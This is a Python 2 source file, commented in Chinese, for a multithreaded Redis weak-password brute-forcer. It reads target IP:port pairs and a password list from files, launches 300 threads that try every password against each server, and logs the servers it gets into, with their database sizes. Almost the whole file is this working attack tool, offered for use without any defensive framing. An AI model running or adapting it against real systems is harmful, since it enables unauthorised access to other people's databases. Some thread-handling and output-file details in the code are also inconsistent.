#coding:GBK
__author__ = 'pt007@vip.sina.com'
import threading #,Queue
import sys,getopt
import ctypes
import re
import os
import socket
import struct
import time
import signal
import csv
import redis,codecs
from Queue import Queue
reload(sys)
sys.setdefaultencoding('GBK')

STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE= -11
STD_ERROR_HANDLE = -12

FOREGROUND_BLACK = 0x0
FOREGROUND_BLUE = 0x01 # text color contains blue.
FOREGROUND_GREEN= 0x02 # text color contains green.
FOREGROUND_RED = 0x04 # text color contains red.
FOREGROUND_INTENSITY = 0x08 # text color is intensified.

BACKGROUND_BLUE = 0x10 # background color contains blue.
BACKGROUND_GREEN= 0x20 # background color contains green.
BACKGROUND_RED = 0x40 # background color contains red.
BACKGROUND_INTENSITY = 0x80 # background color is intensified.
#IP计数器
ip_duo_num=0
#成功爆破数量
ip_success=0
IpFile=file('./redis1.txt') #url列表
#user_dict_path='./redis_user.txt' #用户名文件
PassFile=file('./sql_pass.txt') #密码列表
RedisFile=codecs.open("./redis_success.txt","a")
output_path=codecs.open("./redis_success_all.txt","a") #成功利用后写入的文件
pass_list=[]

while True:
    line = PassFile.readline()
    if len(line) == 0: # Zero length indicates EOF
        break
        #exit()             
    line=line.strip()
    #print line,
    pass_list.append(line)


class redis_crack(threading.Thread):
    def run(self):
        global Queue,url,ip_success
        url = queue.get()
        host,redis_port=url.split(":")
        error_i=0
        
        ip_f=socket.inet_ntoa(struct.pack('!L',ip2long(host)))
        #print "host=%s,port=%s\n" %(ip_f,redis_port)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect((ip_f,int(redis_port)))
            for password in pass_list:
                try:
                    #print "[*] Attacking ip %s:%s\n" %(host,redis_port)
                    r = redis.StrictRedis(host=ip_f, port=int(redis_port),password=password,db=0,socket_timeout=2)
                    db_size=r.dbsize()
                    lock.acquire()
                    if password=='':
                        writer.writerow([ ip_f+":"+redis_port,"pass=null",db_size])
                        clr.print_red_text(ip_f+":"+redis_port+" 可以成功访问! pass=空口令")
                        sp='%s:%s:%s' %(ip_f,redis_port,password)
                        #print "sp1=",sp
                        sp=sp+'\n'
                        RedisFile.write(sp)
                        RedisFile.flush()
                    else:
                        writer.writerow([ip_f+":"+redis_port,"pass="+password,db_size])
                        clr.print_red_text(ip_f+":"+redis_port+" 可以成功访问! pass="+password)
                        sp='%s:%s:%s' %(ip_f,redis_port,password)
                        #print "sp1=",sp
                        sp=sp+'\n'
                        RedisFile.write(sp)
                        RedisFile.flush()
                    output_path.flush()
                    #RedisFile.flush()
                    ip_success=ip_success+1
                    lock.release()
                    queue.join() #退出当前线程 
                except :
                    if show_false==0:
                        lock.acquire()
                        clr.print_blue_text(ip_f+":"+redis_port+" 访问受限! pass="+password)
                        lock.release()
            print "Crack password done,please type redis_success.txt!\n"              
        except:
            if show_false==0:
                lock.acquire()
                clr.print_green_text(ip_f+":"+redis_port+" 没有开启redis服务!")
                lock.release()


class Color:
    ''' See http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winprog/winprog/windows_api_reference.asp
    for information on Windows APIs. - www.sharejs.com'''
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)

    def set_cmd_color(self, color, handle=std_out_handle):
        """(color) -> bit
        Example: set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        """
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
        return bool

    def reset_color(self):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)

    def print_red_text(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()

    def print_green_text(self, print_text):
        self.set_cmd_color(FOREGROUND_GREEN | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()

    def print_blue_text(self, print_text):
        self.set_cmd_color(FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()

    def print_red_text_with_blue_bg(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY| BACKGROUND_BLUE | BACKGROUND_INTENSITY)
        print print_text
        self.reset_color()

def ipFormatChk(ip_str):
   pattern = r"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
   if re.match(pattern, ip_str):
      return True
   else:
      return False

def ip2long(ip):
  """
  Convert an IP string to long
  """
  packedIP = socket.inet_aton(ip)
  return struct.unpack("!L", packedIP)[0]
def handler(signum, frame):
    global is_exit
    is_exit = True
    print "用户主动中断，正在退出程序。。。"
    sys.exit()
    
if __name__=='__main__':
    #实例化颜色类
    clr = Color()
    queue = Queue()
    thread_a=1
    show_false= 0
    lock = threading.Lock()
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)
    try :
        threads = []   #多线程
        print '''
    ----------------------------------------------------------------------------------------
        程序名称：redis弱口令破解程序 v1.1,redis_crackpass2016.py
        程序作者：pt007@vip.sina.com
        程序用法：
    \tredis1.txt里面设置需要扫描的IP地址，如:10.58.2.136:6379 回车后输入下一个IP地址
    \tpython redis_crackpass2016.py
    \t扫描的结果会自动存入当前目录下的redis_success.txt和redis_success_all.txt两个文件!
    -----------------------------------------------------------------------------------------\n'''
        #多IP爆破
        iplist=[]
        #print "redis ip list:",
        while True:
            line = IpFile.readline()
            if len(line) == 0: # Zero length indicates EOF
                break
                #exit()             
            line=line.strip()
            #print line,
            iplist.append(line)
        IpFile.close()
        try:
            csvfile = output_path
        except :
            print "请关闭redis_success_.txt！"
            #sys.exit()
        writer = csv.writer(csvfile)
        writer.writerow([ '空口令redis服务器IP与端口','db0数据个数'])
        print "result of redis crackpass,pass's length [%d]\n" %(len(pass_list))
        for i in iplist:
            queue.put(i)
        for p in range(300): #300个线程
            redis_crack().start()    
          
        for p in range(300):
            queue.join()        
        #print "Crack password done,please type redis_success.txt!\n"

        if ip_success >0 :
            clr.print_green_text( '有 '+str(ip_success)+'个IP成功爆破出。文档存储在目录下success_redis.csv，请及时取出保存。'+str( time.strftime( '%Y-%m-%d %H:%M:%S' , time.localtime() ) ))
        csvfile.close()
        clr.print_green_text( '所有线程已完成工作。结束时间：'+str( time.strftime( '%Y-%m-%d %H:%M:%S' , time.localtime() ) ))
    except Exception, e:
        print "error: %s" % str(e)
     

